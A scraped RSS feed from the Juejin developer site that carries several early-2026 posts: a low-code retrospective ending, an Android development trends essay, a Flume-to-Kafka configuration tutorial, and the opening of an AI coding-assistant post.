<p>回望五年历程，从RAD设计器的初步探索，到注解驱动的核心突破，再到2025年借助AI实现体验升级、跨端贯通与架构革新，最终落地全流程AI解决方案，每一步技术迭代都源于“以真实代码为基，构建高效可控的工程化低代码体系”的初心坚守。</p>
<p>2025年的AI技术爆发，让这份初心插上了腾飞的翅膀；2026年，我们将继续以真实代码为锚，以AI技术为翼，通过技术深化、生态开放、场景深耕，赋能更多企业实现数字化转型的高效落地。在技术创新与业务价值之间搭建坚实桥梁，让每一行代码都成为企业可持续发展的核心资产，初心不变，步履不停。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[聊聊2026年Android开发会是什么样]]></title>    <link>https://juejin.cn/post/7589903499599347766</link>    <guid>https://juejin.cn/post/7589903499599347766</guid>    <pubDate>2026-01-01T07:55:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589903499599347766" data-draft-id="7589893746080596009" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="聊聊2026年Android开发会是什么样"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-01T07:55:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="陆业聪"/> <meta itemprop="url" content="https://juejin.cn/user/13629904404157"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            聊聊2026年Android开发会是什么样
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/13629904404157/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    陆业聪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T07:55:40.000Z" title="Thu Jan 01 2026 07:55:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近在思考Android开发的未来走向，正好现在是2026年初，不如就结合这两年的变化，聊聊我对今年Android开发趋势的一些看法。</p>
<h2 data-id="heading-0">AI真的来了，而且来势汹汹</h2>
<h3 data-id="heading-1">手机上跑大模型已经不是梦</h3>
<p>还记得两年前大家都在讨论ChatGPT的时候，谁能想到现在手机上就能直接跑AI模型了？Google把Gemini Nano塞进了Android系统，虽然功能没有云端版本那么强大，但胜在速度快、不用联网、隐私也有保障。</p>
<p>现在写代码的时候，可能会是这样：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 现在的AI调用已经很简单了</span>
<span class="hljs-keyword">val</span> aiService = AIService.getInstance()
aiService.generateResponse(
    prompt = <span class="hljs-string">"帮我总结今天的会议内容"</span>,
    context = meetingData,
    onDevice = <span class="hljs-literal">true</span> <span class="hljs-comment">// 本地推理，不用担心数据泄露</span>
)
</code></pre>
<p>说实话，ML Kit这两年进步挺大的，以前只能做做图片识别、文字识别这种基础功能，现在连自然语言理解、个性化推荐都能搞定了。</p>
<h3 data-id="heading-2">Android Studio也变聪明了</h3>
<p>最让我惊喜的是Android Studio的AI助手，现在写代码真的轻松多了。它不仅能自动补全代码，还能帮你生成测试用例、检测内存泄漏，甚至能根据你的描述直接生成UI代码。虽然生成的代码有时候还需要调整，但效率确实提升了不少。</p>
<h2 data-id="heading-3">跨平台开发终于靠谱了</h2>
<h3 data-id="heading-4">Kotlin Multiplatform真香</h3>
<p>这两年KMP（Kotlin Multiplatform）的发展速度超出了我的预期。以前做跨平台开发，要么用Flutter但是性能有损耗，要么用React Native但是调试起来头疼。现在KMP成熟了，业务逻辑代码可以在Android、iOS、Web之间共享，UI层用Compose Multiplatform写一套就行。</p>
<p>最关键的是，性能几乎没有损失，因为最终都是编译成原生代码的。我们团队最近的项目，大概80%的代码都实现了跨平台复用，开发效率提升了至少一倍。</p>
<h3 data-id="heading-5">Flutter也没闲着</h3>
<p>Flutter这边也在持续进化，Impeller渲染引擎替代了Skia之后，性能提升很明显，尤其是在复杂动画场景下。而且Material Design 3的支持也越来越好了，做出来的应用看起来更现代。</p>
<p>不过说实话，选Flutter还是KMP，还是要看团队的技术栈。如果团队本来就是Kotlin为主，KMP会更顺手；如果是从零开始，Flutter的生态和文档可能更友好一些。</p>
<h2 data-id="heading-6">鸿蒙的崛起，开发者的新挑战</h2>
<h3 data-id="heading-7">不得不面对的现实</h3>
<p>HarmonyOS NEXT这一年发展得挺快，国内市场份额已经接近30%了。最关键的是，它现在完全不兼容Android了，形成了自己的独立生态。</p>
<p>对我们开发者来说，这意味着什么？<strong>要维护两套代码了</strong>。虽然很多概念是相通的（比如都是声明式UI），但具体实现还是有不少差异。</p>





























<table><thead><tr><th>对比项</th><th>Android</th><th>HarmonyOS</th><th>我的应对方案</th></tr></thead><tbody><tr><td>开发语言</td><td>Kotlin/Java</td><td>ArkTS</td><td>用KMP抽象公共逻辑</td></tr><tr><td>UI框架</td><td>Jetpack Compose</td><td>ArkUI</td><td>保持声明式思维</td></tr><tr><td>分布式能力</td><td>比较弱</td><td>很强大</td><td>定义统一接口</td></tr></tbody></table>
<h3 data-id="heading-8">怎么应对？抽象是关键</h3>
<p>我的做法是尽量把平台相关的代码抽象出来，定义统一的接口：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 定义平台无关的接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">PlatformService</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">shareToDevice</span><span class="hljs-params">(<span class="hljs-keyword">data</span>: <span class="hljs-type">Data</span>)</span></span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">syncData</span><span class="hljs-params">()</span></span>
}

<span class="hljs-comment">// Android的实现</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AndroidPlatformService</span> : <span class="hljs-type">PlatformService</span> {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">shareToDevice</span><span class="hljs-params">(<span class="hljs-keyword">data</span>: <span class="hljs-type">Data</span>)</span></span> {
        <span class="hljs-comment">// 用Nearby Share实现</span>
    }
}

<span class="hljs-comment">// HarmonyOS的实现</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">HarmonyPlatformService</span> : <span class="hljs-type">PlatformService</span> {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">shareToDevice</span><span class="hljs-params">(<span class="hljs-keyword">data</span>: <span class="hljs-type">Data</span>)</span></span> {
        <span class="hljs-comment">// 用分布式软总线实现</span>
    }
}
</code></pre>
<p>这样业务层代码就不用关心底层是什么平台了，切换起来也方便。</p>
<h2 data-id="heading-9">Android系统本身也在进化</h2>
<h3 data-id="heading-10">隐私保护越来越严格</h3>
<p>Google这两年在隐私保护上下了很大功夫。权限控制越来越细，现在不仅有临时权限，还有场景化权限。比如用户可以设置"只在使用应用时允许访问位置"，或者"只允许访问最近7天的照片"。</p>
<p>隐私沙盒也在逐步替代第三方Cookie和广告ID，对广告行业影响挺大的。不过从用户角度来说，这是好事。</p>
<h3 data-id="heading-11">性能优化永无止境</h3>
<p>ART虚拟机又升级了，应用启动速度提升了差不多50%。内存管理也更智能了，自动压缩和GC的策略优化后，应用卡顿的情况明显减少。</p>
<p>电池续航方面，AI驱动的电源管理确实有效果。系统会学习用户的使用习惯，智能调度后台任务，我自己的手机续航时间比去年长了大概20%。</p>
<h3 data-id="heading-12">Jetpack Compose越来越好用</h3>
<p>Compose这两年的优化重点是性能，重组效率提升了好几倍。以前写复杂列表的时候，滑动可能会有点卡，现在基本感觉不到了。</p>
<p>动画系统也增强了不少，共享元素转场现在写起来特别简单，效果还很流畅。Material Design 4也出来了，自适应设计做得更好，同一套代码在手机、平板、折叠屏上都能有不错的表现。</p>
<h2 data-id="heading-13">开发工具和架构的变化</h2>
<h3 data-id="heading-14">Android Studio真的越来越智能</h3>
<p>前面提到了AI助手，这里再展开说说。现在的代码补全不是简单的关键字匹配，而是真正理解你的项目上下文。比如你在写ViewModel，它会根据你的数据模型自动建议合适的状态管理代码。</p>
<p>自动化测试生成也很实用，虽然生成的测试用例还需要人工review，但至少省去了写boilerplate代码的时间。</p>
<h3 data-id="heading-15">架构模式在演进</h3>
<p>这两年大家越来越倾向于用MVI（Model-View-Intent）或者改进版的MVVM。单向数据流的好处是状态管理更清晰，调试起来也方便。</p>
<p>Clean Architecture和模块化设计也越来越普及了。一方面是为了代码复用（特别是跨平台的时候），另一方面也是为了团队协作。模块划分清楚了，不同的人可以并行开发，减少冲突。</p>
<h3 data-id="heading-16">云原生开发成为趋势</h3>
<p>Firebase这两年功能越来越强大，基本上后端的常见需求都能满足。再加上边缘计算的支持，应用的响应速度提升了不少。</p>
<p>Serverless架构也在移动端流行起来了，对于中小团队来说，不用自己维护服务器，成本降低了很多。</p>
<h2 data-id="heading-17">市场和生态的变化</h2>
<h3 data-id="heading-18">开发者需要掌握的技能</h3>
<p>坦白说，现在做Android开发，要学的东西确实比以前多了：</p>
<ul>
<li><strong>Kotlin</strong>：这个没得说，必须精通。协程和Flow要用得溜</li>
<li><strong>Jetpack Compose</strong>：已经不是"推荐"了，而是"必备"</li>
<li><strong>AI/ML</strong>：至少要知道怎么集成TensorFlow Lite，怎么部署模型</li>
<li><strong>跨平台</strong>：KMP或者Flutter，至少要会一个</li>
<li><strong>HarmonyOS</strong>：如果在国内做开发，这个躲不掉</li>
</ul>
<p>听起来压力挺大的，但其实很多概念是相通的。掌握了一个，学其他的会快很多。</p>
<h3 data-id="heading-19">应用类型的变化</h3>
<p>这两年明显感觉到，AI原生应用越来越多了。各种智能助手、AI写作工具、AI图片处理应用层出不穷。</p>
<p>AR/VR应用也在增多，ARCore成熟了之后，做AR应用的门槛降低了不少。虽然元宇宙的概念没有前两年那么火了，但AR在实际场景中的应用（比如家居设计、导航）确实在增加。</p>
<p>健康医疗类应用也是一个增长点，特别是和可穿戴设备结合之后，能做的事情更多了。</p>
<h2 data-id="heading-20">给同行的一些建议</h2>
<h3 data-id="heading-21">技术储备方面</h3>
<ol>
<li><strong>Kotlin基础要扎实</strong>：协程、Flow、泛型这些要真正理解，不能只会用</li>
<li><strong>Compose要多练</strong>：声明式UI的思维方式和传统View体系不太一样，需要时间适应</li>
<li><strong>AI不要怕</strong>：从TensorFlow Lite入手，先跑通一个简单的模型，再慢慢深入</li>
<li><strong>跨平台可以尝试</strong>：KMP的学习曲线其实不陡，Kotlin会了之后上手很快</li>
</ol>
<h3 data-id="heading-22">架构能力要重视</h3>
<p>模块化设计真的很重要，特别是在做跨平台开发的时候。把平台相关的代码和业务逻辑分离，后面维护起来会轻松很多。</p>
<p>Clean Architecture不是银弹，但确实能让代码结构更清晰。不过也不要过度设计，根据项目规模选择合适的架构。</p>
<p>测试也要重视起来，单元测试、UI测试都要写。虽然前期会花点时间，但长期来看绝对值得。</p>
<h3 data-id="heading-23">适应生态变化</h3>
<p>HarmonyOS的发展是个现实问题，国内开发者必须面对。我的建议是早做准备，至少要了解基本概念和开发流程。</p>
<p>多参与开源社区，关注技术动态。Android生态变化很快，闭门造车很容易落后。</p>
<p>建立抽象层，降低平台迁移成本。这不仅是为了应对HarmonyOS，也是为了未来可能出现的其他平台。</p>
<h2 data-id="heading-24">最后说两句</h2>
<p>2026年的Android开发，确实比几年前复杂了不少。AI、跨平台、多生态，每一个都是不小的挑战。</p>
<p>但换个角度想，这也意味着更多的机会。掌握了这些新技术，能做的事情更多了，职业发展的空间也更大了。</p>
<p>最重要的是保持学习的热情。技术在变，但解决问题的思维方式是相通的。基础打牢了，新技术学起来会快很多。</p>
<p>共勉。</p>
<hr/>
<p><strong>P.S.</strong> 这篇文章是基于当前的技术趋势做的预测，具体发展还要看实际情况。如果你有不同的看法，欢迎交流讨论。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[flume集成kafka]]></title>    <link>https://juejin.cn/post/7589907831198826522</link>    <guid>https://juejin.cn/post/7589907831198826522</guid>    <pubDate>2026-01-01T06:09:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589907831198826522" data-draft-id="7589835342146486282" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="flume集成kafka"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-01T06:09:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="苏三的开发日记"/> <meta itemprop="url" content="https://juejin.cn/user/4248949048749213"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            flume集成kafka
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4248949048749213/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    苏三的开发日记
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T06:09:02.000Z" title="Thu Jan 01 2026 06:09:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">1.解压flume</h4>
<p>生产环境中，可以设置flume的堆内存为4G或以上。
修改/opt/module/flume/conf/flume-env.sh文件，配置如下参数（虚拟机环境暂不配置）</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 修改JVM配置</span>
export <span class="hljs-attr">JAVA_OPTS</span>=<span class="hljs-string">"-Xms4096m -Xmx4096m -Dcom.sun.management.jmxremote"</span>
</code></pre>
<h4 data-id="heading-1">2.配置job,编辑文件file_to_kafka.conf</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 定义组件</span>
<span class="hljs-attr">a1.sources</span> = r1
<span class="hljs-attr">a1.channels</span> = c1

<span class="hljs-comment"># 配置source</span>
<span class="hljs-attr">a1.sources.r1.type</span> = TAILDIR
<span class="hljs-attr">a1.sources.r1.filegroups</span> = f1
<span class="hljs-comment"># 日志（数据）文件</span>
<span class="hljs-attr">a1.sources.r1.filegroups.f1</span> = /opt/module/flume/data/test.log
<span class="hljs-attr">a1.sources.r1.positionFile</span> = /opt/module/flume/taildir_position.json

<span class="hljs-comment"># 配置channel</span>
<span class="hljs-comment"># 采用Kafka Channel，省去了Sink，提高了效率</span>
<span class="hljs-attr">a1.channels.c1.type</span> = org.apache.flume.channel.kafka.KafkaChannel
<span class="hljs-attr">a1.channels.c1.kafka.bootstrap.servers</span> = hadoop102:<span class="hljs-number">9092</span>,hadoop103:<span class="hljs-number">9092</span>,hadoop104:<span class="hljs-number">9092</span>
<span class="hljs-attr">a1.channels.c1.kafka.topic</span> = test
<span class="hljs-attr">a1.channels.c1.parseAsFlumeEvent</span> = <span class="hljs-literal">false</span>

<span class="hljs-comment"># 组装 </span>
<span class="hljs-attr">a1.sources.r1.channels</span> = c1
</code></pre>
<h4 data-id="heading-2">3.启动job</h4>
<pre><code class="hljs language-bash" lang="bash">bin/flume-ng agent -n a1 -c conf/ -f job/file_to_kafka.conf
</code></pre>
<h4 data-id="heading-3">4.其他集成</h4>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/gitee.com/arhi</span><span class="hljs-regexp">/cs-spring/tree</span><span class="hljs-regexp">/feature/snow</span><span class="hljs-regexp">/springboot/springboot</span>-ai-coding/kafka-demo
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 终于在 AI 代码助手里找到了“Vibe”]]></title>    <link>https://juejin.cn/post/7589903248619470874</link>    <guid>https://juejin.cn/post/7589903248619470874</guid>    <pubDate>2026-01-01T06:44:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589903248619470874" data-draft-id="7589908657681236018" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 终于在 AI 代码助手里找到了“Vibe”"/> <meta itemprop="keywords" content="Trae,AI编程,程序员"/> <meta itemprop="datePublished" content="2026-01-01T06:44:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Konata_9"/> <meta itemprop="url" content="https://juejin.cn/user/888061123629997"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 终于在 AI 代码助手里找到了“Vibe”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/888061123629997/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Konata_9
